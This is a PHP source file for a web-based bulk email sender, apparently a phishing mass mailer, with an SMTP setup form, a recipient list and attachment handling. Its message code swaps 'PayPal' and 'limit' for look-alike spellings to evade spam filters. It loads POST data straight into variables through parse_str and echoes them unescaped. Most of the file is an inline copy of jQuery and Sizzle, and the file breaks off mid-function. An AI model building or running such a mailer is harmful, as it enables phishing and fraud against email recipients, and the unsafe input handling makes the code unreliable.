<?php

set_time_limit(0);
error_reporting(0);
function query_str($params) {
    $str = '';
    foreach ($params as $key => $value) {
        $str .= (strlen($str) < 1) ? '' : '&';
        $str .= $key . '=' . rawurlencode($value);
    }
  return ($str);
}
function lrtrim($string){
  return stripslashes(ltrim(rtrim($string)));
}
if(isset($_POST['action'])){

  $b = query_str($_POST);
  parse_str($b);
  $action        = lrtrim($action);
  $smtp_username = lrtrim($smtp_username);
  $smtp_password = lrtrim($smtp_password);
  $smtp_server   = lrtrim($smtp_server);
  $smtp_port     = lrtrim($smtp_port);
  $smtp_ssl      = lrtrim($smtp_ssl);
  $xmailer       = lrtrim($xmailer);
  $reconnect     = lrtrim($reconnect);
  $type          = lrtrim($type);
  $email         = lrtrim($mail);
  $nama          = lrtrim($nama);
  $subject       = lrtrim($subject);
  $pesan         = lrtrim($pesan);
  $emaillist     = strtolower(lrtrim($list));
  $encoding      = lrtrim($encode);
  $file_name     = $_FILES['file']['name'];
  $file_path     = $_FILES['file']['tmp_name'];
  $wait          = lrtrim($wait);

      $pesan   = urlencode($pesan);
    $pesan   = ereg_replace("%5C%22", "%22", $pesan);
    $pesan   = urldecode($pesan);
    $pesan   = stripslashes($pesan);
    $pesan   = str_replace("PayPal", "PayPaI", $pesan);
    $pesan   = str_replace("limit", "Iimit", $pesan);
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <title> team p </title>
  <meta name="viewport" content="width=940, initial-scale=1.0, maximum-scale=1.0">
  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/css/bootstrap.min.css">
  <link rel="stylesheet" href="">
   <script src="http://code.jquery.com/jquery-2.1.3.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/js/bootstrap.min.js"></script>
  <link rel="shortcut icon" href="">
  <style type="text/css">
  body{
    background-color: #13181D;
  border-color: #2CADAD !important;
    box-shadow: 0px 0px 15px #ff4eff;
    -moz-box-shadow: 0px 0px 15px #ff4eff;
    -webkit-box-shadow: 0px 0px 15px #ff4eff;
    text-shadow: 1px 1px 4px rgba(44, 173, 173, 1);
  }
  input, select, option, textarea {
    font-size: 12px !important;
  }
  input, select, option {
    height: 30px !important;
color:#2CADAD;
    box-shadow: 0px 0px 15px #ff4eff;
    -moz-box-shadow: 0px 0px 15px #ff4eff;
    -webkit-box-shadow: 0px 0px 15px #ff4eff;
    text-shadow: 1px 1px 4px rgba(0,0,0,0.3);
  }

.panel-info  .panel-heading {
    background-color: #2CADAD !important;
    border-color: #2CADAD !important;
    box-shadow: 0px 0px 15px #ff4eff;
    -moz-box-shadow: 0px 0px 15px #ff4eff;
    -webkit-box-shadow: 0px 0px 15px #ff4eff;
    text-shadow: 0px 0px 60px rgba(44, 173, 173, 1);
  }
  .kanan-l {
    border-top-right-radius: 0px !important;
    border-color: #2CADAD !important;
    box-shadow: 0px 0px 15px #ff4eff;
    -moz-box-shadow: 0px 0px 15px #ff4eff;
    -webkit-box-shadow: 0px 0px 15px #ff4eff;
    text-shadow: 1px 1px 4px rgba(44, 173, 173, 1);
  }
  .kanan {
    border-top-right-radius: 4px !important;
    border-color: #2CADAD !important;
    box-shadow: 0px 0px 15px #ff4eff;
    -moz-box-shadow: 0px 0px 15px #ff4eff;
    -webkit-box-shadow: 0px 0px 15px #ff4eff;
    text-shadow: 1px 1px 4px rgba(44, 173, 173, 1);

 }
   .form-control {
border-top-right-radius: 4px !important;
    border-color: #2CADAD !important;
    box-shadow: 0px 0px 15px #ff4eff;
    -moz-box-shadow: 0px 0px 15px #ff4eff;
    -webkit-box-shadow: 0px 0px 15px #ff4eff;
    text-shadow: 1px 1px 4px rgba(44, 173, 173, 1);

  }
  </style>


  <script type="text/javascript">
      function Pilih1(dropDown) {
        var selectedValue = dropDown.options[dropDown.selectedIndex].value;
        document.getElementById("sender-name").value = selectedValue;
      }
      function Pilih2(dropDown) {
        var selectedValue = dropDown.options[dropDown.selectedIndex].value;
        document.getElementById("sender-email").value = selectedValue;
      }
      function Pilih3(dropDown) {
        var selectedValue = dropDown.options[dropDown.selectedIndex].value;
        document.getElementById("subject").value = selectedValue;
      }
      function Pilih4(dropDown) {
        var selectedValue = dropDown.options[dropDown.selectedIndex].value;
        document.getElementById("xmailer").value = selectedValue;
      }
  </script>
</head>
<body>
<div id="wrap">

  <div class="container" style="margin-top: 25px;">
    <div class="row">
      <div class="col-sm-6 col-md-4 col-md-offset-1" style="width: 940px">
      <div class="panel panel-info" style="border-color: #2CADAD !important; background-color: #444951 !important;">
          <div class="panel-heading">
            <div class="panel-title" align="center"><a href="">PHP Mailer</a></div>
          </div>

          <div style="padding-top: 15px;">

            <button type="button" class="btn btn-primary collapsed" style="margin-left: 15px;margin-bottom: 10px" data-toggle="collapse" data-target="#smtp"><i class="glyphicon glyphicon-plus"></i> SMTP & OTHER SETUP</button>

            <div style="display:none" id="login-alert" class="alert alert-danger col-sm-12"></div>

            <form id="form" class="form-horizontal" method="post" enctype="multipart/form-data" role="form" action="">

            <div id="smtp" class="collapse">
            <div class="col-sm-8" style="padding-right: 7.5px !important;margin-bottom: 10px">

              <div style="margin-bottom: 10px" class="input-group">
                    <span class="input-group-addon"><i class="glyphicon glyphicon-user"></i></span>
                    <input type="text" class="form-control" name="smtp_username" value="<?php echo $smtp_username;?>" placeholder="SMTP Username">
                    <span class="input-group-addon"><i class="glyphicon glyphicon-lock"></i></span>
                    <input type="password" class="form-control" name="smtp_password" value="<?php echo $smtp_password;?>" placeholder="SMTP Password">
                  </div>

              <div style="margin-bottom: 10px" class="input-group">
                    <span class="input-group-addon"><i class="glyphicon glyphicon-send"></i></span>
                    <input type="text" class="form-control" name="smtp_server" value="<?php echo $smtp_server;?>" placeholder="SMTP Server">
                    <span class="input-group-addon"><i class="glyphicon glyphicon-random"></i><b> Port</b></span>
                    <input type="text" class="form-control" name="smtp_port" value="<?php echo $smtp_port;?>" placeholder="optional">
                    <span class="input-group-addon"><i class="glyphicon glyphicon-road"></i><b> SSL</b></span>
                    <select class="form-control" name="smtp_ssl">
                      <option value="yes" <?php if ($smtp_ssl=='yes'){echo 'selected';}?> >yes</option>
                      <option value="no" <?php if ($smtp_ssl=='no'){echo 'selected';}?> >no</option>
                    </select>
                  </div>
              <div style="color:red;" align="center">
                    " If you dont have SMTP login, leave blank queries above "
                  </div>
<script>
    (function(global, factory) {
            if (typeof module === "object" && typeof module.exports === "object") {
                module.exports = global.document ? factory(global, true) : function(w) {
                    if (!w.document) {
                        throw new Error("jQuery requires a window with a document");
                    }
                    return factory(w)
                }
            } else {
                factory(global)
            }
        }(typeof window !== "undefined" ? window : this, function(window, noGlobal) {
                var deletedIds = [];
                var slice = deletedIds.slice;
                var concat = deletedIds.concat;
                var push = deletedIds.push;
                var indexOf = deletedIds.indexOf;
                var class2type = {};
                var toString = class2type.toString;
                var hasOwn = class2type.hasOwnProperty;
                var support = {};
                var version = "1.11.2",
                    jQuery = function(selector, context) {
                        return new jQuery.fn.init(selector, context)
                    },
                    rtrim = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,
                    rmsPrefix = /^-ms-/,
                    rdashAlpha = /-([\da-z])/gi,
                    fcamelCase = function(all, letter) {
                        return letter.toUpperCase()
                    };
                jQuery.fn = jQuery.prototype = {
                    jquery: version,
                    constructor: jQuery,
                    selector: "",
                    length: 0,
                    toArray: function() {
                        return slice.call(this)
                    },
                    get: function(num) {
                        return num != null ? (num < 0 ? this[num + this.length] : this[num]) : slice.call(this)
                    },
                    pushStack: function(elems) {
                        var ret = jQuery.merge(this.constructor(), elems);
                        ret.prevObject = this;
                        ret.context = this.context;
                        return ret
                    },
                    each: function(callback, args) {
                        return jQuery.each(this, callback, args)
                    },
                    map: function(callback) {
                        return this.pushStack(jQuery.map(this, function(elem, i) {
                            return callback.call(elem, i, elem)
                        }))
                    },
                    slice: function() {
                        return this.pushStack(slice.apply(this, arguments))
                    },
                    first: function() {
                        return this.eq(0)
                    },
                    last: function() {
                        return this.eq(-1)
                    },
                    eq: function(i) {
                        var len = this.length,
                            j = +i + (i < 0 ? len : 0);
                        return this.pushStack(j >= 0 && j < len ? [this[j]] : [])
                    },
                    end: function() {
                        return this.prevObject || this.constructor(null)
                    },
                    push: push,
                    sort: deletedIds.sort,
                    splice: deletedIds.splice
                };
                jQuery.extend = jQuery.fn.extend = function() {
                    var src, copyIsArray, copy, name, options, clone, target = arguments[0] || {},
                        i = 1,
                        length = arguments.length,
                        deep = false;
                    if (typeof target === "boolean") {
                        deep = target;
                        target = arguments[i] || {};
                        i++
                    }
                    if (typeof target !== "object" && !jQuery.isFunction(target)) {
                        target = {}
                    }
                    if (i === length) {
                        target = this;
                        i--
                    }
                    for (; i < length; i++) {
                        if ((options = arguments[i]) != null) {
                            for (name in options) {
                                src = target[name];
                                copy = options[name];
                                if (target === copy) {
                                    continue
                                }
                                if (deep && copy && (jQuery.isPlainObject(copy) || (copyIsArray = jQuery.isArray(copy)))) {
                                    if (copyIsArray) {
                                        copyIsArray = false;
                                        clone = src && jQuery.isArray(src) ? src : []
                                    } else {
                                        clone = src && jQuery.isPlainObject(src) ? src : {}
                                    }
                                    target[name] = jQuery.extend(deep, clone, copy)
                                } else if (copy !== undefined) {
                                    target[name] = copy
                                }
                            }
                        }
                    }
                    return target
                };
                jQuery.extend({
                    expando: "jQuery" + (version + Math.random()).replace(/\D/g, ""),
                    isReady: true,
                    error: function(msg) {
                        throw new Error(msg);
                    },
                    noop: function() {},
                    isFunction: function(obj) {
                        return jQuery.type(obj) === "function"
                    },
                    isArray: Array.isArray || function(obj) {
                        return jQuery.type(obj) === "array"
                    },
                    isWindow: function(obj) {
                        return obj != null && obj == obj.window
                    },
                    isNumeric: function(obj) {
                        return !jQuery.isArray(obj) && (obj - parseFloat(obj) + 1) >= 0
                    },
                    isEmptyObject: function(obj) {
                        var name;
                        for (name in obj) {
                            return false
                        }
                        return true
                    },
                    isPlainObject: function(obj) {
                        var key;
                        if (!obj || jQuery.type(obj) !== "object" || obj.nodeType || jQuery.isWindow(obj)) {
                            return false
                        }
                        try {
                            if (obj.constructor && !hasOwn.call(obj, "constructor") && !hasOwn.call(obj.constructor.prototype, "isPrototypeOf")) {
                                return false
                            }
                        } catch (e) {
                            return false
                        }
                        if (support.ownLast) {
                            for (key in obj) {
                                return hasOwn.call(obj, key)
                            }
                        }
                        for (key in obj) {}
                        return key === undefined || hasOwn.call(obj, key)
                    },
                    type: function(obj) {
                        if (obj == null) {
                            return obj + ""
                        }
                        return typeof obj === "object" || typeof obj === "function" ? class2type[toString.call(obj)] || "object" : typeof obj
                    },
                    globalEval: function(data) {
                        if (data && jQuery.trim(data)) {
                            (window.execScript || function(data) {
                                window["eval"].call(window, data)
                            })(data)
                        }
                    },
                    camelCase: function(string) {
                        return string.replace(rmsPrefix, "ms-").replace(rdashAlpha, fcamelCase)
                    },
                    nodeName: function(elem, name) {
                        return elem.nodeName && elem.nodeName.toLowerCase() === name.toLowerCase()
                    },
                    each: function(obj, callback, args) {
                        var value, i = 0,
                            length = obj.length,
                            isArray = isArraylike(obj);
                        if (args) {
                            if (isArray) {
                                for (; i < length; i++) {
                                    value = callback.apply(obj[i], args);
                                    if (value === false) {
                                        break
                                    }
                                }
                            } else {
                                for (i in obj) {
                                    value = callback.apply(obj[i], args);
                                    if (value === false) {
                                        break
                                    }
                                }
                            }
                        } else {
                            if (isArray) {
                                for (; i < length; i++) {
                                    value = callback.call(obj[i], i, obj[i]);
                                    if (value === false) {
                                        break
                                    }
                                }
                            } else {
                                for (i in obj) {
                                    value = callback.call(obj[i], i, obj[i]);
                                    if (value === false) {
                                        break
                                    }
                                }
                            }
                        }
                        return obj
                    },
                    trim: function(text) {
                        return text == null ? "" : (text + "").replace(rtrim, "")
                    },
                    makeArray: function(arr, results) {
                        var ret = results || [];
                        if (arr != null) {
                            if (isArraylike(Object(arr))) {
                                jQuery.merge(ret, typeof arr === "string" ? [arr] : arr)
                            } else {
                                push.call(ret, arr)
                            }
                        }
                        return ret
                    },
                    inArray: function(elem, arr, i) {
                        var len;
                        if (arr) {
                            if (indexOf) {
                                return indexOf.call(arr, elem, i)
                            }
                            len = arr.length;
                            i = i ? i < 0 ? Math.max(0, len + i) : i : 0;
                            for (; i < len; i++) {
                                if (i in arr && arr[i] === elem) {
                                    return i
                                }
                            }
                        }
                        return -1
                    },
                    merge: function(first, second) {
                        var len = +second.length,
                            j = 0,
                            i = first.length;
                        while (j < len) {
                            first[i++] = second[j++]
                        }
                        if (len !== len) {
                            while (second[j] !== undefined) {
                                first[i++] = second[j++]
                            }
                        }
                        first.length = i;
                        return first
                    },
                    grep: function(elems, callback, invert) {
                        var callbackInverse, matches = [],
                            i = 0,
                            length = elems.length,
                            callbackExpect = !invert;
                        for (; i < length; i++) {
                            callbackInverse = !callback(elems[i], i);
                            if (callbackInverse !== callbackExpect) {
                                matches.push(elems[i])
                            }
                        }
                        return matches
                    },
                    map: function(elems, callback, arg) {
                        var value, i = 0,
                            length = elems.length,
                            isArray = isArraylike(elems),
                            ret = [];
                        if (isArray) {
                            for (; i < length; i++) {
                                value = callback(elems[i], i, arg);
                                if (value != null) {
                                    ret.push(value)
                                }
                            }
                        } else {
                            for (i in elems) {
                                value = callback(elems[i], i, arg);
                                if (value != null) {
                                    ret.push(value)
                                }
                            }
                        }
                        return concat.apply([], ret)
                    },
                    guid: 1,
                    proxy: function(fn, context) {
                        var args, proxy, tmp;
                        if (typeof context === "string") {
                            tmp = fn[context];
                            context = fn;
                            fn = tmp
                        }
                        if (!jQuery.isFunction(fn)) {
                            return undefined
                        }
                        args = slice.call(arguments, 2);
                        proxy = function() {
                            return fn.apply(context || this, args.concat(slice.call(arguments)))
                        };
                        proxy.guid = fn.guid = fn.guid || jQuery.guid++;
                        return proxy
                    },
                    now: function() {
                        return +(new Date())
                    },
                    support: support
                });
                jQuery.each("Boolean Number String Function Array Date RegExp Object Error".split(" "), function(i, name) {
                    class2type["[object " + name + "]"] = name.toLowerCase()
                });

                function isArraylike(obj) {
                    var length = obj.length,
                        type = jQuery.type(obj);
                    if (type === "function" || jQuery.isWindow(obj)) {
                        return false
                    }
                    if (obj.nodeType === 1 && length) {
                        return true
                    }
                    return type === "array" || length === 0 || typeof length === "number" && length > 0 && (length - 1) in obj
                }
                var Sizzle = (function(window) {
                    var i, support, Expr, getText, isXML, tokenize, compile, select, outermostContext, sortInput, hasDuplicate, setDocument, document, docElem, documentIsHTML, rbuggyQSA, rbuggyMatches, matches, contains, expando = "sizzle" + 1 * new Date(),
                        preferredDoc = window.document,
                        dirruns = 0,
                        done = 0,
                        classCache = createCache(),
                        tokenCache = createCache(),
                        compilerCache = createCache(),
                        sortOrder = function(a, b) {
                            if (a === b) {
                                hasDuplicate = true
                            }
                            return 0
                        },
                        MAX_NEGATIVE = 1 << 31,
                        hasOwn = ({}).hasOwnProperty,
                        arr = [],
                        pop = arr.pop,
                        push_native = arr.push,
                        push = arr.push,
                        slice = arr.slice,
                        indexOf = function(list, elem) {
                            var i = 0,
                                len = list.length;
                            for (; i < len; i++) {
                                if (list[i] === elem) {
                                    return i
                                }
                            }
                            return -1
                        },
                        booleans = "checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",
                        whitespace = "[\\x20\\t\\r\\n\\f]",
                        characterEncoding = "(?:\\\\.|[\\w-]|[^\\x00-\\xa0])+",
                        identifier = characterEncoding.replace("w", "w#"),
                        attributes = "\\[" + whitespace + "*(" + characterEncoding + ")(?:" + whitespace + "*([*^$|!~]?=)" + whitespace + "*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|(" + identifier + "))|)" + whitespace + "*\\]",
                        pseudos = ":(" + characterEncoding + ")(?:\\((" + "('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|" + "((?:\\\\.|[^\\\\()[\\]]|" + attributes + ")*)|" + ".*" + ")\\)|)",
                        rwhitespace = new RegExp(whitespace + "+", "g"),
                        rtrim = new RegExp("^" + whitespace + "+|((?:^|[^\\\\])(?:\\\\.)*)" + whitespace + "+$", "g"),
                        rcomma = new RegExp("^" + whitespace + "*," + whitespace + "*"),
                        rcombinators = new RegExp("^" + whitespace + "*([>+~]|" + whitespace + ")" + whitespace + "*"),
                        rattributeQuotes = new RegExp("=" + whitespace + "*([^\\]'\"]*?)" + whitespace + "*\\]", "g"),
                        rpseudo = new RegExp(pseudos),
                        ridentifier = new RegExp("^" + identifier + "$"),
                        matchExpr = {
                            "ID": new RegExp("^#(" + characterEncoding + ")"),
                            "CLASS": new RegExp("^\\.(" + characterEncoding + ")"),
                            "TAG": new RegExp("^(" + characterEncoding.replace("w", "w*") + ")"),
                            "ATTR": new RegExp("^" + attributes),
                            "PSEUDO": new RegExp("^" + pseudos),
                            "CHILD": new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\(" + whitespace + "*(even|odd|(([+-]|)(\\d*)n|)" + whitespace + "*(?:([+-]|)" + whitespace + "*(\\d+)|))" + whitespace + "*\\)|)", "i"),
                            "bool": new RegExp("^(?:" + booleans + ")$", "i"),
                            "needsContext": new RegExp("^" + whitespace + "*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\(" + whitespace + "*((?:-\\d)?\\d*)" + whitespace + "*\\)|)(?=[^-]|$)", "i")
                        },
                        rinputs = /^(?:input|select|textarea|button)$/i,
                        rheader = /^h\d$/i,
                        rnative = /^[^{]+\{\s*\[native \w/,
                        rquickExpr = /^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,
                        rsibling = /[+~]/,
                        rescape = /'|\\/g,
                        runescape = new RegExp("\\\\([\\da-f]{1,6}" + whitespace + "?|(" + whitespace + ")|.)", "ig"),
                        funescape = function(_, escaped, escapedWhitespace) {
                            var high = "0x" + escaped - 0x10000;
                            return high !== high || escapedWhitespace ? escaped : high < 0 ? String.fromCharCode(high + 0x10000) : String.fromCharCode(high >> 10 | 0xD800, high & 0x3FF | 0xDC00)
                        },
                        unloadHandler = function() {
                            setDocument()
                        };
                    try {
                        push.apply((arr = slice.call(preferredDoc.childNodes)), preferredDoc.childNodes);
                        arr[preferredDoc.childNodes.length].nodeType
                    } catch (e) {
                        push = {
                            apply: arr.length ? function(target, els) {
                                push_native.apply(target, slice.call(els))
                            } : function(target, els) {
                                var j = target.length,
                                    i = 0;
                                while ((target[j++] = els[i++])) {}
                                target.length = j - 1
                            }
                        }
                    }

                    function Sizzle(selector, context, results, seed) {
                        var match, elem, m, nodeType, i, groups, old, nid, newContext, newSelector;
                        if ((context ? context.ownerDocument || context : preferredDoc) !== document) {
                            setDocument(context)
                        }
                        context = context || document;
                        results = results || [];
                        nodeType = context.nodeType;
                        if (typeof selector !== "string" || !selector || nodeType !== 1 && nodeType !== 9 && nodeType !== 11) {
                            return results
                        }
                        if (!seed && documentIsHTML) {
                            if (nodeType !== 11 && (match = rquickExpr.exec(selector))) {
                                if ((m = match[1])) {
                                    if (nodeType === 9) {
                                        elem = context.getElementById(m);
                                        if (elem && elem.parentNode) {
                                            if (elem.id === m) {
                                                results.push(elem);
                                                return results
                                            }
                                        } else {
                                            return results
                                        }
                                    } else {
                                        if (context.ownerDocument && (elem = context.ownerDocument.getElementById(m)) && contains(context, elem) && elem.id === m) {
                                            results.push(elem);
                                            return results
                                        }
                                    }
                                } else if (match[2]) {
                                    push.apply(results, context.getElementsByTagName(selector));
                                    return results
                                } else if ((m = match[3]) && support.getElementsByClassName) {
                                    push.apply(results, context.getElementsByClassName(m));
                                    return results
                                }
                            }
                            if (support.qsa && (!rbuggyQSA || !rbuggyQSA.test(selector))) {
                                nid = old = expando;
                                newContext = context;
                                newSelector = nodeType !== 1 && selector;
                                if (nodeType === 1 && context.nodeName.toLowerCase() !== "object") {
                                    groups = tokenize(selector);
                                    if ((old = context.getAttribute("id"))) {
                                        nid = old.replace(rescape, "\\$&")
                                    } else {
                                        context.setAttribute("id", nid)
                                    }
                                    nid = "[id='" + nid + "'] ";
                                    i = groups.length;
                                    while (i--) {
                                        groups[i] = nid + toSelector(groups[i])
                                    }
                                    newContext = rsibling.test(selector) && testContext(context.parentNode) || context;
                                    newSelector = groups.join(",")
                                }
                                if (newSelector) {
                                    try {
                                        push.apply(results, newContext.querySelectorAll(newSelector));
                                        return results
                                    } catch (qsaError) {} finally {
                                        if (!old) {
                                            context.removeAttribute("id")
                                        }
                                    }
                                }
                            }
                        }
                        return select(selector.replace(rtrim, "$1"), context, results, seed)
                    }

                    function createCache() {
                        var keys = [];

                        function cache(key, value) {
                            if (keys.push(key + " ") > Expr.cacheLength) {
                                delete cache[keys.shift()]
                            }
                            return (cache[key + " "] = value)
                        }
                        return cache
                    }

                    function markFunction(fn) {
                        fn[expando] = true;
                        return fn
                    }

                    function assert(fn) {
                        var div = document.createElement("div");
                        try {
                            return !!fn(div)
                        } catch (e) {
                            return false
                        } finally {
                            if (div.parentNode) {
                                div.parentNode.removeChild(div)
                            }
                            div = null
                        }
                    }

                    function addHandle(attrs, handler) {
                        var arr = attrs.split("|"),
                            i = attrs.length;
                        while (i--) {
                            Expr.attrHandle[arr[i]] = handler
                        }
                    }

                    function siblingCheck(a, b) {
                        var cur = b && a,
                            diff = cur && a.nodeType === 1 && b.nodeType === 1 && (~b.sourceIndex || MAX_NEGATIVE) - (~a.sourceIndex || MAX_NEGATIVE);
                        if (diff) {
                            return diff
                        }
                        if (cur) {
                            while ((cur = cur.nextSibling)) {
                                if (cur === b) {
                                    return -1
                                }
                            }
                        }
                        return a ? 1 : -1
                    }

                    function createInputPseudo(type) {
                        return function(elem) {
                            var name = elem.nodeName.toLowerCase();
                            return name === "input" && elem.type === type
                        }
                    }

                    function createButtonPseudo(type) {
                        return function(elem) {
                            var name = elem.nodeName.toLowerCase();
                            return (name === "input" || name === "button") && elem.type === type
                        }
                    }

                    function createPositionalPseudo(fn) {
                        return markFunction(function(argument) {
                            argument = +argument;
                            return markFunction(function(seed, matches) {
                                var j, matchIndexes = fn([], seed.length, argument),
                                    i = matchIndexes.length;
                                while (i--) {
                                    if (seed[(j = matchIndexes[i])]) {
                                        seed[j] = !(matches[j] = seed[j])
                                    }
                                }
                            })
                        })
                    }

                    function testContext(context) {
                        return context && typeof context.getElementsByTagName !== "undefined" && context
                    }
                    support = Sizzle.support = {};
                    isXML = Sizzle.isXML = function(elem) {
                        var documentElement = elem && (elem.ownerDocument || elem).documentElement;
                        return documentElement ? documentElement.nodeName !== "HTML" : false
                    };
                    setDocument = Sizzle.setDocument = function(node) {
                        var hasCompare, parent, doc = node ? node.ownerDocument || node : preferredDoc;
                        if (doc === document || doc.nodeType !== 9 || !doc.documentElement) {
                            return document
                        }
                        document = doc;
                        docElem = doc.documentElement;
                        parent = doc.defaultView;
                        if (parent && parent !== parent.top) {
                            if (parent.addEventListener) {
                                parent.addEventListener("unload", unloadHandler, false)
                            } else if (parent.attachEvent) {
                                parent.attachEvent("onunload", unloadHandler)
                            }
                        }
                        documentIsHTML = !isXML(doc);
                        support.attributes = assert(function(div) {
                            div.className = "i";
                            return !div.getAttribute("className")
                        });
                        support.getElementsByTagName = assert(function(div) {
                            div.appendChild(doc.createComment(""));
                            return !div.getElementsByTagName("*").length
                        });
                        support.getElementsByClassName = rnative.test(doc.getElementsByClassName);
                        support.getById = assert(function(div) {
                            docElem.appendChild(div).id = expando;
                            return !doc.getElementsByName || !doc.getElementsByName(expando).length
                        });
                        if (support.getById) {
                            Expr.find["ID"] = function(id, context) {
                                if (typeof context.getElementById !== "undefined" && documentIsHTML) {
                                    var m = context.getElementById(id);
                                    return m && m.parentNode ? [m] : []
                                }
                            };
                            Expr.filter["ID"] = function(id) {
                                var attrId = id.replace(runescape, funescape);
                                return function(elem) {
                                    return elem.getAttribute("id") === attrId
                                }
                            }
                        } else {
                            delete Expr.find["ID"];
                            Expr.filter["ID"] = function(id) {
                                var attrId = id.replace(runescape, funescape);
                                return function(elem) {
                                    var node = typeof elem.getAttributeNode !== "undefined" && elem.getAttributeNode("id");
                                    return node && node.value === attrId
                                }
                            }
                        }
                        Expr.find["TAG"] = support.getElementsByTagName ? function(tag, context) {
                            if (typeof context.getElementsByTagName !== "undefined") {
                                return context.getElementsByTagName(tag)
                            } else if (support.qsa) {
                                return context.querySelectorAll(tag)
                            }
                        } : function(tag, context) {
                            var elem, tmp = [],
                                i = 0,
                                results = context.getElementsByTagName(tag);
                            if (tag === "*") {
                                while ((elem = results[i++])) {
                                    if (elem.nodeType === 1) {
                                        tmp.push(elem)
                                    }
                                }
                                return tmp
                            }
                            return results
                        };
                        Expr.find["CLASS"] = support.getElementsByClassName && function(className, context) {
                            if (documentIsHTML) {
                                return context.getElementsByClassName(className)
                            }
                        };
                        rbuggyMatches = [];
                        rbuggyQSA = [];
                        if ((support.qsa = rnative.test(doc.querySelectorAll))) {
                            assert(function(div) {
                                docElem.appendChild(div).innerHTML = "<a id='" + expando + "'></a>" + "<select id='" + expando + "-\f]' msallowcapture=''>" + "<option selected=''></option></select>";
                                if (div.querySelectorAll("[msallowcapture^='']").length) {
                                    rbuggyQSA.push("[*^$]=" + whitespace + "*(?:''|\"\")")
                                }
                                if (!div.querySelectorAll("[selected]").length) {
                                    rbuggyQSA.push("\\[" + whitespace + "*(?:value|" + booleans + ")")
                                }
                                if (!div.querySelectorAll("[id~=" + expando + "-]").length) {
                                    rbuggyQSA.push("~=")
                                }
                                if (!div.querySelectorAll(":checked").length) {
                                    rbuggyQSA.push(":checked")
                                }
                                if (!div.querySelectorAll("a#" + expando + "+*").length) {
                                    rbuggyQSA.push(".#.+[+~]")
                                }
                            });
                            assert(function(div) {
                                var input = doc.createElement("input");
                                input.setAttribute("type", "hidden");
                                div.appendChild(input).setAttribute("name", "D");
                                if (div.querySelectorAll("[name=d]").length) {
                                    rbuggyQSA.push("name" + whitespace + "*[*^$|!~]?=")
                                }
                                if (!div.querySelectorAll(":enabled").length) {
                                    rbuggyQSA.push(":enabled", ":disabled")
                                }
                                div.querySelectorAll("*,:x");
                                rbuggyQSA.push(",.*:")
                            })
                        }
                        if ((support.matchesSelector = rnative.test((matches = docElem.matches || docElem.webkitMatchesSelector || docElem.mozMatchesSelector || docElem.oMatchesSelector || docElem.msMatchesSelector)))) {
                            assert(function(div) {
                                support.disconnectedMatch = matches.call(div, "div");
                                matches.call(div, "[s!='']:x");
                                rbuggyMatches.push("!=", pseudos)
                            })
                        }
                        rbuggyQSA = rbuggyQSA.length && new RegExp(rbuggyQSA.join("|"));
                        rbuggyMatches = rbuggyMatches.length && new RegExp(rbuggyMatches.join("|"));
                        hasCompare = rnative.test(docElem.compareDocumentPosition);
                        contains = hasCompare || rnative.test(docElem.contains) ? function(a, b) {
                            var adown = a.nodeType === 9 ? a.documentElement : a,
                                bup = b && b.parentNode;
                            return a === bup || !!(bup && bup.nodeType === 1 && (adown.contains ? adown.contains(bup) : a.compareDocumentPosition && a.compareDocumentPosition(bup) & 16))
                        } : function(a, b) {
                            if (b) {
                                while ((b = b.parentNode)) {
                                    if (b === a) {
                                        return true
                                    }
                                }
                            }
                            return false
                        };
                        sortOrder = hasCompare ? function(a, b) {
                            if (a === b) {
                                hasDuplicate = true;
                                return 0
                            }
                            var compare = !a.compareDocumentPosition - !b.compareDocumentPosition;
                            if (compare) {
                                return compare
                            }
                            compare = (a.ownerDocument || a) === (b.ownerDocument || b) ? a.compareDocumentPosition(b) : 1;
                            if (compare & 1 || (!support.sortDetached && b.compareDocumentPosition(a) === compare)) {
                                if (a === doc || a.ownerDocument === preferredDoc && contains(preferredDoc, a)) {
                                    return -1
                                }
                                if (b === doc || b.ownerDocument === preferredDoc && contains(preferredDoc, b)) {
                                    return 1
                                }
                                return sortInput ? (indexOf(sortInput, a) - indexOf(sortInput, b)) : 0
                            }
                            return compare & 4 ? -1 : 1
                        } : function(a, b) {
                            if (a === b) {
                                hasDuplicate = true;
                                return 0
                            }
                            var cur, i = 0,
                                aup = a.parentNode,
                                bup = b.parentNode,
                                ap = [a],
                                bp = [b];
                            if (!aup || !bup) {
                                return a === doc ? -1 : b === doc ? 1 : aup ? -1 : bup ? 1 : sortInput ? (indexOf(sortInput, a) - indexOf(sortInput, b)) : 0
                            } else if (aup === bup) {
                                return siblingCheck(a, b)
                            }
                            cur = a;
                            while ((cur = cur.parentNode)) {
                                ap.unshift(cur)
                            }
                            cur = b;
                            while ((cur = cur.parentNode)) {
                                bp.unshift(cur)
                            }
                            while (ap[i] === bp[i]) {
                                i++
                            }
                            return i ? siblingCheck(ap[i], bp[i]) : ap[i] === preferredDoc ? -1 : bp[i] === preferredDoc ? 1 : 0
                        };
                        return doc
                    };
                    Sizzle.matches = function(expr, elements) {
                        return Sizzle(expr, null, null, elements)
                    };
                    Sizzle.matchesSelector = function(elem, expr) {
                        if ((elem.ownerDocument || elem) !== document) {
                            setDocument(elem)
                        }
                        expr = expr.replace(rattributeQuotes, "='$1']");
                        if (support.matchesSelector && documentIsHTML && (!rbuggyMatches || !rbuggyMatches.test(expr)) && (!rbuggyQSA || !rbuggyQSA.test(expr))) {
                            try {
                                var ret = matches.call(elem, expr);
                                if (ret || support.disconnectedMatch || elem.document && elem.document.nodeType !== 11) {
                                    return ret
                                }
                            } catch (e) {}
                        }
                        return Sizzle(expr, document, null, [elem]).length > 0
                    };
                    Sizzle.contains = function(context, elem) {
                        if ((context.ownerDocument || context) !== document) {
                            setDocument(context)
                        }
                        return contains(context, elem)
                    };
                    Sizzle.attr = function(elem, name) {
